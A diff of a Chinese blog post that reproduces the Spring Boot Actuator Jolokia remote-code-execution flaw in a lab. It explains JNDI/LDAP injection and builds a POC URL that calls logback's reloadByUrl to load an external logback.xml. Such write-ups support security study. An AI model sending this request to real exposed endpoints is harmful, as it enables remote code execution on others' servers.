@@ -7,22 +7,23 @@
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     <meta name="description" content="0x01 漏洞测试环境一个包含 Spring Boot Actuators 的漏洞应用，该测试环境包含4个库：spring-boot-starter-web、spring-boot-starter-actuator、spring-cloud-starter-netflix-eureka-client、jolokia-core。注意该测试需要在jdk1.8.181版本或其他版本下编译运行才可以。本文">
-<meta name="keywords" content="安全渗透,Java,spring boot,spring boot actuator">
+<meta name="keywords" content="Java,安全渗透,spring boot,spring boot actuator">
 <meta property="og:type" content="article">
 <meta property="og:title" content="spring boot actuator jolokia 漏洞复现报告">
 <meta property="og:url" content="http://yoursite.com/2019/12/03/Spring-Boot-Actuator-Jolokia/index.html">
 <meta property="og:site_name" content="Yang’s Blog">
 <meta property="og:description" content="0x01 漏洞测试环境一个包含 Spring Boot Actuators 的漏洞应用，该测试环境包含4个库：spring-boot-starter-web、spring-boot-starter-actuator、spring-cloud-starter-netflix-eureka-client、jolokia-core。注意该测试需要在jdk1.8.181版本或其他版本下编译运行才可以。本文">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="http://yoursite.com/Users/flowerlake/Desktop/Screen%20Shot%202019-12-10%20at%2020.21.35.png">
-<meta property="og:image" content="http://yoursite.com/Users/flowerlake/Desktop/Screen%20Shot%202019-12-10%20at%2019.41.32.png">
-<meta property="og:image" content="http://yoursite.com/Users/flowerlake/Desktop/Screen%20Shot%202019-12-10%20at%2020.08.30.png">
-<meta property="og:image" content="http://yoursite.com/Users/flowerlake/Desktop/Screen%20Shot%202019-12-10%20at%2022.18.04.png">
-<meta property="og:updated_time" content="2019-12-10T14:34:39.600Z">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/006tNbRwgy1g9s0nuahkjj30hs07ldg0.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/006tNbRwgy1g9s0o4s7wwj31m40g8gp3.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/006tNbRwgy1g9s0obehadj31c90u0n5j.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/006tNbRwgy1g9s0oepeyij31100ggmzd.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/006tNbRwgy1g9s0onl9syj31mm0u0h1w.jpg">
+<meta property="og:updated_time" content="2019-12-10T14:55:46.896Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="spring boot actuator jolokia 漏洞复现报告">
 <meta name="twitter:description" content="0x01 漏洞测试环境一个包含 Spring Boot Actuators 的漏洞应用，该测试环境包含4个库：spring-boot-starter-web、spring-boot-starter-actuator、spring-cloud-starter-netflix-eureka-client、jolokia-core。注意该测试需要在jdk1.8.181版本或其他版本下编译运行才可以。本文">
-<meta name="twitter:image" content="http://yoursite.com/Users/flowerlake/Desktop/Screen%20Shot%202019-12-10%20at%2020.21.35.png">
+<meta name="twitter:image" content="https://tva1.sinaimg.cn/large/006tNbRwgy1g9s0nuahkjj30hs07ldg0.jpg">
     
     
         
@@ -150,8 +151,7 @@
   
 
   <div class="content" itemprop="articleBody">
-    <h3 id="0x01-漏洞测试环境"><a href="#0x01-漏洞测试环境" class="headerlink" title="0x01 漏洞测试环境"></a>0x01 漏洞测试环境</h3><p>一个包含 Spring Boot Actuators 的漏洞应用，该测试环境包含4个库：spring-boot-starter-web、spring-boot-starter-actuator、spring-cloud-starter-netflix-eureka-client、jolokia-core。注意该测试需要在jdk1.8.181版本或其他版本下编译运行才可以。本文使用了Java的JNDI注入，JNDI可以对接RMI服务，也可以对接LDAP服务，LDAP也能返回JNDI Reference对象，利用过程与RMI Reference基本一致，只是lookup()中的URL为一个LDAP地址：ldap://xxx/xxx，由攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象。并且LDAP服务的Reference远程加载Factory类不受上一点中 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。</p>
-<p>不过在2018年10月，Java最终也修复了这个利用点，对LDAP Reference远程工厂类的加载增加了限制，在Oracle JDK 11.0.1、8u182、7u191、6u201之后 com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false，还对应的分配了一个漏洞编号CVE-2018-3149。因此该测试环境需要在以下基本版本下编译，漏洞才生效。</p>
+    <h3 id="0x01-漏洞测试环境"><a href="#0x01-漏洞测试环境" class="headerlink" title="0x01 漏洞测试环境"></a>0x01 漏洞测试环境</h3><p>一个包含 Spring Boot Actuators 的漏洞应用，该测试环境包含4个库：spring-boot-starter-web、spring-boot-starter-actuator、spring-cloud-starter-netflix-eureka-client、jolokia-core。注意该测试需要在jdk1.8.181版本或其他版本下编译运行才可以。本文使用了Java的JNDI注入，JNDI可以对接RMI服务，也可以对接LDAP服务，LDAP也能返回JNDI Reference对象，利用过程与RMI Reference基本一致，只是lookup()中的URL为一个LDAP地址：ldap://xxx/xxx，由攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象。并且LDAP服务的Reference远程加载Factory类不受上一点中 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。<br><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1g9s0nuahkjj30hs07ldg0.jpg" alt="OracleRMIAndLDAP"><br>不过在2018年10月，Java最终也修复了这个利用点，对LDAP Reference远程工厂类的加载增加了限制，在Oracle JDK 11.0.1、8u182、7u191、6u201之后 com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false，还对应的分配了一个漏洞编号CVE-2018-3149。因此该测试环境需要在以下基本版本下编译，漏洞才生效。</p>
 <h3 id="0x02-Spring-Boot-Actuator介绍"><a href="#0x02-Spring-Boot-Actuator介绍" class="headerlink" title="0x02 Spring Boot Actuator介绍"></a>0x02 Spring Boot Actuator介绍</h3><p>Spring Boot Acuator 可以帮助你监控和管理Spring Boot应用，比如健康检查、审计、统计和HTTP追踪等。所有的这些特性可以通过JMX或者HTTP endpoints来获得。也就是说 Acuator 可以通过原生的端点(endpoint)来执行，常用的原生端点有 health、env、info，对于web应用而言，可以通过 JMX 来获得，该JMX就是jolokia。</p>
 <p>参考资料：</p>
 <ul>
@@ -189,11 +189,7 @@
 <li>或者指定 logger 的有效级别</li>
 </ul>
 <p>在该测试中我们已经找到的Spring Boot Acuator 程序中的一个 reloadByURL 的利用点，利用该函数可以加载任意外部资源，并且具备解析xml文档的功能。那么就可以利用xml文件中 insertFromJNDI 标签，该标签可以加载任意Java类，从而实现远程Java命令执行，在16年blackhat中有一场关于N/D服务以及恶意类绑定的演讲，其中详细描述了 如何利用 JNDI 实现 Java应用程序的远程执行。</p>
-<p>参考资料：</p>
-<ul>
-<li><a href="/Users/flowerlake/Pictures/文章配图/OracleRMIAndLDAP.jpg">logback Chapter 10: JMX Configurator</a></li>
-</ul>
-<h3 id="0x06-如何找到利用点"><a href="#0x06-如何找到利用点" class="headerlink" title="0x06 如何找到利用点"></a>0x06 如何找到利用点</h3><p><img src="/Users/flowerlake/Desktop/Screen Shot 2019-12-10 at 20.21.35.png" alt="Screen Shot 2019-12-10 at 20.21.35"><br>参见官网给出的文档显示，jolokia列出了所有可以被操作的Mbean。在前面我们也看到了，在http请求中，其中的一项是Mbean name。下面我们还可以从源码的角度看一下。</p>
+<h3 id="0x06-如何找到利用点"><a href="#0x06-如何找到利用点" class="headerlink" title="0x06 如何找到利用点"></a>0x06 如何找到利用点</h3><p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1g9s0o4s7wwj31m40g8gp3.jpg" alt="Screen Shot 2019-12-10 at 20.21.35"><br>参见官网给出的文档显示，jolokia列出了所有可以被操作的Mbean。在前面我们也看到了，在http请求中，其中的一项是Mbean name。下面我们还可以从源码的角度看一下。</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// com.sun.jmx.interceptor.DefaultMbeanServerInterceptor.java</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(ObjectName name, String operationName,</span></span></span><br><span class="line"><span class="function"><span class="params">                         Object params[], String signature[])</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> InstanceNotFoundException, MBeanException,</span></span><br><span class="line"><span class="function">                   ReflectionException </span>&#123;</span><br><span class="line"></span><br><span class="line">        name = nonDefaultDomain(name);</span><br><span class="line"></span><br><span class="line">        DynamicMBean instance = getMBean(name);</span><br><span class="line">        checkMBeanPermission(instance, operationName, name, <span class="string">"invoke"</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> instance.invoke(operationName, params, signature);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">            rethrowMaybeMBeanException(t);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> AssertionError();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 <p>这段代码的大致意思也就明白了，就是最终执行的时候是通过getMBean这个函数来得到一个实例，然后这个实例执行后面的操作。</p>
 <h3 id="0x07-POC构造"><a href="#0x07-POC构造" class="headerlink" title="0x07  POC构造"></a>0x07  POC构造</h3><p>我们大概了解了该程序的漏洞位置以及相应的原理，如何构造有效的POC还是一个漏洞利用的重点。<br>先看一下<strong>JmxExecRequest</strong>的参数：</p>
@@ -203,12 +199,12 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.jolokia.util.EscapeUtil.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String PATH_ESCAPE = <span class="string">"!"</span>;</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;String&gt; <span class="title">parsePath</span><span class="params">(String pPath)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Special cases which simply implies 'no path'</span></span><br><span class="line">    <span class="keyword">if</span> (pPath == <span class="keyword">null</span> || pPath.equals(<span class="string">""</span>) || pPath.equals(<span class="string">"/"</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">		<span class="keyword">return</span> replaceWildcardsWithNull(split(pPath, PATH_ESCAPE, <span class="string">"/"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>从上面两段代码中可以看到，<strong>createGetRequest</strong>函数最终会通过split函数来分割<strong>pathInfo</strong>，其中 <strong>PATH_ESCAPE</strong>的值为”!”，也就是说当!和/在一起的时候，!/ 会被解析为 / 。这样可以用来构造 reloadByUrl的URL值。</p>
 <p>另外，在官网可以查询到 jolokia 的执行语法路径参数。</p>
-<p><img src="/Users/flowerlake/Desktop/Screen Shot 2019-12-10 at 19.41.32.png" alt="Screen Shot 2019-12-10 at 19.37.16"></p>
+<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1g9s0obehadj31c90u0n5j.jpg" alt="Screen Shot 2019-12-10 at 19.37.16"></p>
 <blockquote>
 <p>该请求路径也就是 <strong><base url>/exec/<mbean name>/<operation name>/<arg1>/<arg2>/….</arg2></arg1></operation></mbean></strong> </p>
 </blockquote>
 <p>logback的Mbean：</p>
-<p><img src="/Users/flowerlake/Desktop/Screen Shot 2019-12-10 at 20.08.30.png" alt="Screen Shot 2019-12-10 at 20.08.30"></p>
+<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1g9s0oepeyij31100ggmzd.jpg" alt="Screen Shot 2019-12-10 at 20.08.30"></p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mbean name 为 ch.qos.logback.classic:name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/</span><br><span class="line">Operation: reloadByUrl</span><br><span class="line">Params: http:!/!/127.0.0.1!/logback.xml</span><br></pre></td></tr></table></figure>
 <p>因此，最终构造出来的POC代码为：<br>127.0.0.1:8090/jolokia/exec/ch.qos.logback.classic:name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByUrl/http:!/!/127.0.0.1!/logback.xml </p>
 <h3 id="0x09-漏洞验证流程"><a href="#0x09-漏洞验证流程" class="headerlink" title="0x09 漏洞验证流程"></a>0x09 漏洞验证流程</h3><ol>
@@ -230,7 +226,7 @@
 </li>
 </ol>
 <p>最终的测试结果如下：</p>
-<p><img src="/Users/flowerlake/Desktop/Screen Shot 2019-12-10 at 22.18.04.png" alt="Screen Shot 2019-12-10 at 22.18.04"></p>
+<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1g9s0onl9syj31mm0u0h1w.jpg" alt="Screen Shot 2019-12-10 at 22.18.04"></p>
 
   </div>
 </article>
